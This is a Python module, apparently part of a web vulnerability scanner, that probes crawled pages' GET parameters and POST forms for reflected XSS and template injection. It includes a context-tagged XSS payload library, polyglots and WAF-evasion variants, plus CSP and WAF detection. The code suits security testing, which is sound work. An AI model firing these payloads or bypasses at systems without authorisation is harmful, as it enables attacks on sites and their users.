# modules/xss.py
# Advanced Reflected / Stored XSS Scanner
# Techniques : HTML-context, attribute-context, JS-context, URL-context,
#              template-injection probes, DOM-sink analysis, polyglots
# Features   : Context-aware injection, WAF detection + bypass, CSP analysis,
#              execution-confidence scoring, concurrent testing, structured findings
from config import HEADERS, TIMEOUT
import requests
import re
import hashlib
import logging
from bs4 import BeautifulSoup, Comment
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import Optional

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────
# Data model
# ─────────────────────────────────────────────

@dataclass
class Finding:
    severity:   str        # Critical / High / Medium / Low
    xss_type:   str        # Reflected / Stored-hint / DOM-sink / CSP-bypass
    context:    str        # html / attribute / javascript / url / template
    method:     str        # GET / POST
    url:        str
    parameter:  str
    payload:    str
    evidence:   str        # snippet confirming unescaped reflection
    waf_bypass: bool = False
    csp_note:   str  = ""  # CSP header present but potentially bypassable

    def __str__(self):
        bypass = " [WAF-bypass]"  if self.waf_bypass else ""
        csp    = f" | CSP: {self.csp_note}" if self.csp_note else ""
        return (f"[{self.severity}] {self.xss_type} ({self.context} ctx){bypass} | "
                f"{self.method} {self.url} | param={self.parameter} | "
                f"payload={self.payload!r} | evidence={self.evidence!r}{csp}")

    def dedup_key(self):
        return hashlib.md5(
            f"{self.url}:{self.parameter}:{self.context}".encode()
        ).hexdigest()


# ─────────────────────────────────────────────
# Payload library  (context-tagged)
# ─────────────────────────────────────────────

# Each entry: (payload, context_tag)
STANDARD_PAYLOADS: list[tuple[str, str]] = [
    # ── HTML context ──────────────────────────────────────────────────
    ("<script>print(0xDEAD)</script>",                        "html"),
    ("<img src=x onerror=print(0xDEAD)>",                     "html"),
    ("<svg onload=print(0xDEAD)>",                            "html"),
    ("<body onpageshow=print(0xDEAD)>",                       "html"),
    ("<details open ontoggle=print(0xDEAD)>",                 "html"),
    ("<iframe srcdoc='<script>print(0xDEAD)</script>'>",      "html"),
    ("<math><mtext></table><img src=x onerror=print(0xDEAD)>","html"),  # mXSS

    # ── Attribute context ─────────────────────────────────────────────
    ('" onfocus=print(0xDEAD) autofocus x="',                 "attribute"),
    ("' onmouseover=print(0xDEAD) x='",                       "attribute"),
    ('" onpointerover=print(0xDEAD) x="',                     "attribute"),
    ('`\` onmouseover=print(0xDEAD)',                         "attribute"),
    ('" style="animation-name:x" onanimationstart=print(0xDEAD) x="', "attribute"),

    # ── JavaScript context ────────────────────────────────────────────
    ("';print(0xDEAD);//",                                    "javascript"),
    ("\\';print(0xDEAD);//",                                  "javascript"),
    ("</script><script>print(0xDEAD)</script>",               "javascript"),
    ("${print(0xDEAD)}",                                      "javascript"),  # template literal
    ("\"-alert(0xDEAD)-\"",                                   "javascript"),

    # ── URL / href / src context ──────────────────────────────────────
    ("javascript:print(0xDEAD)",                              "url"),
    ("JaVaScRiPt:print(0xDEAD)",                              "url"),         # case bypass
    ("data:text/html,<script>print(0xDEAD)</script>",         "url"),
    ("vbscript:msgbox(0xDEAD)",                               "url"),         # IE legacy

    # ── Server-side template injection probes ─────────────────────────
    ("{{7*7}}",                                               "template"),    # Jinja2/Twig/etc.
    ("${7*7}",                                                "template"),    # Freemarker/EL
    ("<%= 7*7 %>",                                            "template"),    # ERB/EJS
    ("#{7*7}",                                                "template"),    # Ruby/Slim
]

# Polyglot payloads – attempt to fire across multiple contexts at once
POLYGLOT_PAYLOADS: list[tuple[str, str]] = [
    (
        "'\"`><img src=x onerror=print(0xDEAD)>/**/</script><script>print(0xDEAD)</script>",
        "polyglot",
    ),
    (
        "javascript:/*--></title></style></textarea></script>"
        "<svg/onload='+/\"`/+/onmouseover=1/+/[*/[]/+print(0xDEAD)//'>",
        "polyglot",
    ),
]

# WAF-bypass variants of a simple alert/print probe
WAF_BYPASS_PAYLOADS: list[tuple[str, str]] = [
    ("<ScRiPt>print(0xDEAD)</sCrIpT>",               "html"),   # mixed case
    ("<scr\x00ipt>print(0xDEAD)</scr\x00ipt>",       "html"),   # null byte
    ("<img/src=x onerror=print(0xDEAD)>",             "html"),   # slash separator
    ("<svg/onload=&#112;&#114;&#105;&#110;&#116;(0xDEAD)>", "html"),  # HTML entities
    ("<img src=x onerror=\x09print(0xDEAD)>",         "html"),   # tab in event
    ("%3cscript%3eprint(0xDEAD)%3c%2fscript%3e",      "html"),   # URL-encoded
    ("<script>eval(String.fromCharCode(112,114,105,110,116,40,57,49,55,50,53,41))</script>", "html"),  # fromCharCode
    ("<%2fscript><script>print(0xDEAD)</script>",     "html"),   # partial encode
    ("<svg><animate onbegin=print(0xDEAD) attributeName=x dur=1s>", "html"),  # animate
    ("<input onfocus=print(0xDEAD) autofocus>",       "html"),   # autofocus without quotes
]

# Canary token: unique string to locate exact injection point in response
CANARY = "xC4n4rY57831"

# Template injection: if response echoes 49, it evaluated 7*7
TEMPLATE_EVAL_MAP = {
    "{{7*7}}":  "49",
    "${7*7}":   "49",
    "<%= 7*7 %>": "49",
    "#{7*7}":   "49",
}

# DOM sinks to look for in page source
DOM_SINKS = [
    r"document\.write\s*\(",
    r"innerHTML\s*=",
    r"outerHTML\s*=",
    r"eval\s*\(",
    r"setTimeout\s*\(\s*['\"`]",
    r"setInterval\s*\(\s*['\"`]",
    r"location\.href\s*=",
    r"location\.replace\s*\(",
    r"\.src\s*=",
    r"insertAdjacentHTML\s*\(",
    r"\.html\s*\(",                  # jQuery
    r"\$\s*\(\s*location",           # jQuery location sink
]


# ─────────────────────────────────────────────
# CSP analysis
# ─────────────────────────────────────────────

def _analyse_csp(headers: dict) -> str:
    """
    Inspect Content-Security-Policy header.
    Returns a note if the policy is absent or has known bypasses.
    """
    csp = headers.get("Content-Security-Policy", "") or headers.get("X-Content-Security-Policy", "")
    if not csp:
        return "No CSP header — XSS fully exploitable in browser"
    notes = []
    if "unsafe-inline" in csp:
        notes.append("unsafe-inline present")
    if "unsafe-eval" in csp:
        notes.append("unsafe-eval present")
    if "*" in csp:
        notes.append("wildcard source")
    if "data:" in csp:
        notes.append("data: URI allowed")
    return "; ".join(notes) if notes else ""


# ─────────────────────────────────────────────
# WAF detection
# ─────────────────────────────────────────────

def _detect_waf(resp: requests.Response) -> bool:
    waf_headers = {"x-sucuri-id", "x-firewall", "x-waf", "cf-ray",
                   "x-cdn", "x-protected-by", "x-fw-protect"}
    if any(h.lower() in resp.headers for h in waf_headers):
        return True
    waf_bodies = ["access denied", "request blocked", "security check",
                  "you have been blocked", "cloudflare ray id", "waf block"]
    return any(kw in resp.text.lower() for kw in waf_bodies)


# ─────────────────────────────────────────────
# Reflection & execution analysis
# ─────────────────────────────────────────────

def _detect_injection_context(html: str, canary: str) -> str:
    """
    Parse the response DOM and determine where the canary appears.
    Returns one of: html | attribute | javascript | url | comment | none
    """
    if canary not in html:
        return "none"
    soup = BeautifulSoup(html, "html.parser")

    # Check inside script tags
    for tag in soup.find_all("script"):
        if canary in (tag.string or ""):
            return "javascript"

    # Check inside HTML comments
    for node in soup.find_all(string=lambda t: isinstance(t, Comment)):
        if canary in node:
            return "comment"

    # Check inside tag attributes
    for tag in soup.find_all(True):
        for attr_val in tag.attrs.values():
            val = attr_val if isinstance(attr_val, str) else " ".join(attr_val)
            if canary in val:
                return "attribute"

    # Check href/src specifically for URL context
    for tag in soup.find_all(["a", "iframe", "img", "script", "link"]):
        for attr in ("href", "src", "action", "data"):
            if canary in tag.get(attr, ""):
                return "url"

    return "html"


def _is_unescaped(html: str, payload: str) -> bool:
    """
    Return True only if the payload appears in the response without
    HTML-entity encoding that would prevent execution.
    """
    if payload not in html:
        return False
    # Common escapes that neutralise the payload
    neutralised = any(marker in html for marker in
                      ["&lt;script", "&lt;img", "&lt;svg", "\\u003c",
                       "%3cscript", "\\x3c", "&#60;", "&#x3c;"])
    return not neutralised


def _evidence_snippet(html: str, payload: str, window: int = 120) -> str:
    idx = html.find(payload)
    if idx == -1:
        # Try first 10 chars of payload
        idx = html.find(payload[:10])
    if idx == -1:
        return ""
    start = max(0, idx - 20)
    return html[start: start + window].replace("\n", " ").strip()


def _template_injection(html: str, payload: str) -> bool:
    expected = TEMPLATE_EVAL_MAP.get(payload)
    return expected is not None and expected in html


def _dom_sinks_in_page(html: str) -> list[str]:
    return [sink for sink in DOM_SINKS if re.search(sink, html)]


# ─────────────────────────────────────────────
# Network helpers
# ─────────────────────────────────────────────

def _get_safe(url: str, session: requests.Session) -> Optional[requests.Response]:
    try:
        return session.get(url, headers=HEADERS, timeout=TIMEOUT,
                           allow_redirects=True)
    except Exception as exc:
        logger.debug("GET error %s: %s", url, exc)
        return None


def _post_safe(url: str, data: dict,
               session: requests.Session) -> Optional[requests.Response]:
    try:
        return session.post(url, data=data, headers=HEADERS,
                            timeout=TIMEOUT, allow_redirects=True)
    except Exception as exc:
        logger.debug("POST error %s: %s", url, exc)
        return None


# ─────────────────────────────────────────────
# Per-parameter worker
# ─────────────────────────────────────────────

def _test_parameter(
    base_url:     str,
    param_name:   str,
    baseline_resp: requests.Response,
    session:      requests.Session,
    method:       str = "GET",
    form_action:  str = "",
    form_inputs:  list[str] = None,
) -> list[Finding]:

    findings: list[Finding] = []
    seen_contexts: set[str] = set()
    waf_detected  = _detect_waf(baseline_resp)
    csp_note      = _analyse_csp(dict(baseline_resp.headers))

    parsed     = urlparse(base_url)
    base_params = parse_qs(parsed.query)

    def build_get_url(payload: str) -> str:
        p = base_params.copy()
        p[param_name] = [payload]
        return parsed._replace(query=urlencode(p, doseq=True)).geturl()

    def fire(payload: str) -> Optional[requests.Response]:
        if method == "POST":
            data = {n: payload for n in (form_inputs or [param_name])}
            return _post_safe(form_action or base_url, data, session)
        return _get_safe(build_get_url(payload), session)

    def poc_label(payload: str) -> str:
        if method == "POST":
            return f"POST {form_action or base_url}"
        return build_get_url(payload)

    # ── Step 1: canary probe to detect reflection context ─────────────
    canary_r = fire(CANARY)
    reflected_context = "none"
    if canary_r is not None:
        reflected_context = _detect_injection_context(canary_r.text, CANARY)

    # Choose payload set based on WAF and context
    payload_pool = STANDARD_PAYLOADS + POLYGLOT_PAYLOADS
    if waf_detected:
        payload_pool = WAF_BYPASS_PAYLOADS + payload_pool

    # ── Step 2: XSS payload probing ───────────────────────────────────
    for payload, ctx in payload_pool:
        # Skip JS payloads if canary isn't reflected in JS (reduces noise)
        if ctx == "javascript" and reflected_context not in ("javascript", "none"):
            continue
        if ctx == "attribute" and reflected_context not in ("attribute", "none"):
            continue
        if ctx in seen_contexts:
            continue

        r = fire(payload)
        if r is None:
            continue

        if _is_unescaped(r.text, payload):
            snippet = _evidence_snippet(r.text, payload)
            findings.append(Finding(
                severity   = "Critical" if ctx in ("html", "polyglot") else "High",
                xss_type   = "Reflected",
                context    = ctx,
                method     = method,
                url        = poc_label(payload),
                parameter  = param_name,
                payload    = payload,
                evidence   = snippet,
                waf_bypass = payload in dict(WAF_BYPASS_PAYLOADS),
                csp_note   = csp_note,
            ))
            seen_contexts.add(ctx)

    # ── Step 3: Template injection probe ─────────────────────────────
    if "template" not in seen_contexts:
        for tmpl_payload, ctx in STANDARD_PAYLOADS:
            if ctx != "template":
                continue
            r = fire(tmpl_payload)
            if r and _template_injection(r.text, tmpl_payload):
                findings.append(Finding(
                    severity  = "Critical",
                    xss_type  = "Server-Side Template Injection",
                    context   = "template",
                    method    = method,
                    url       = poc_label(tmpl_payload),
                    parameter = param_name,
                    payload   = tmpl_payload,
                    evidence  = f"Response contained '49' for payload {tmpl_payload!r}",
                    csp_note  = csp_note,
                ))
                seen_contexts.add("template")
                break

    return findings


# ─────────────────────────────────────────────
# DOM-sink passive analysis
# ─────────────────────────────────────────────

def _passive_dom_scan(page_url: str, html: str) -> list[Finding]:
    """
    Non-intrusive: flag pages that pass URL parameters into dangerous JS sinks.
    These are informational findings — no active payload is fired.
    """
    findings = []
    sinks = _dom_sinks_in_page(html)
    if not sinks:
        return findings

    parsed = urlparse(page_url)
    if not parsed.query:
        return findings

    # Check if any URL param value appears near a sink (rough heuristic)
    params = parse_qs(parsed.query)
    for param, values in params.items():
        for val in values:
            if val in html:
                for sink in sinks:
                    # Check if the param value is within 300 chars of the sink
                    match = re.search(sink, html)
                    if match:
                        ctx_start = max(0, match.start() - 300)
                        ctx_end   = min(len(html), match.end() + 300)
                        if val in html[ctx_start:ctx_end]:
                            findings.append(Finding(
                                severity  = "Medium",
                                xss_type  = "DOM-based (passive hint)",
                                context   = "javascript",
                                method    = "GET",
                                url       = page_url,
                                parameter = param,
                                payload   = "(no active payload — passive analysis)",
                                evidence  = f"Param value near sink: {sink}",
                            ))
                            break
    return findings


# ─────────────────────────────────────────────
# Public entry point
# ─────────────────────────────────────────────

def scan(target_url: str, pages: list[tuple[str, requests.Response]]) -> list[str]:
    """
    Advanced XSS scan across all crawled pages.

    Args:
        target_url : root URL of the target (for scoping)
        pages      : list of (url, response) tuples from the crawler

    Returns:
        List of human-readable finding strings, or a clean result message.
    """
    all_findings: list[Finding] = []
    seen_dedup:   set[str]      = set()
    session = requests.Session()

    tasks = []

    for page_url, baseline_resp in pages:
        html = baseline_resp.text

        # ── Passive DOM analysis (no requests needed) ─────────────────
        for f in _passive_dom_scan(page_url, html):
            key = f.dedup_key()
            if key not in seen_dedup:
                seen_dedup.add(key)
                all_findings.append(f)

        # ── Active GET parameter tests ────────────────────────────────
        parsed = urlparse(page_url)
        if parsed.query:
            for param_name in parse_qs(parsed.query):
                tasks.append((_test_parameter, dict(
                    base_url      = page_url,
                    param_name    = param_name,
                    baseline_resp = baseline_resp,
                    session       = session,
                    method        = "GET",
                )))

        # ── Active POST form tests ────────────────────────────────────
        soup = BeautifulSoup(html, "html.parser")
        for form in soup.find_all("form"):
            action      = urljoin(page_url, form.get("action", "") or page_url)
            method_tag  = form.get("method", "get").strip().lower()
            if method_tag != "post":
                continue
            form_inputs = [
                inp.get("name")
                for inp in form.find_all(["input", "textarea", "select"])
                if inp.get("name")
            ]
            if not form_inputs:
                continue
            for param_name in form_inputs:
                tasks.append((_test_parameter, dict(
                    base_url      = page_url,
                    param_name    = param_name,
                    baseline_resp = baseline_resp,
                    session       = session,
                    method        = "POST",
                    form_action   = action,
                    form_inputs   = form_inputs,
                )))

    # ── Concurrent active tests ───────────────────────────────────────
    max_workers = min(10, max(1, len(tasks)))
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(fn, **kw): kw for fn, kw in tasks}
        for future in as_completed(futures):
            try:
                for finding in future.result():
                    key = finding.dedup_key()
                    if key not in seen_dedup:
                        seen_dedup.add(key)
                        all_findings.append(finding)
            except Exception as exc:
                logger.warning("Worker raised: %s", exc)

    # ── Sort by severity ──────────────────────────────────────────────
    order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
    all_findings.sort(key=lambda f: order.get(f.severity, 9))

    if not all_findings:
        return ["✅ No XSS vulnerabilities detected with current payloads."]

    output = [f"⚠️  {len(all_findings)} XSS finding(s) detected:\n"]
    for i, f in enumerate(all_findings, 1):
        output.append(f"  [{i}] {f}")

    return output
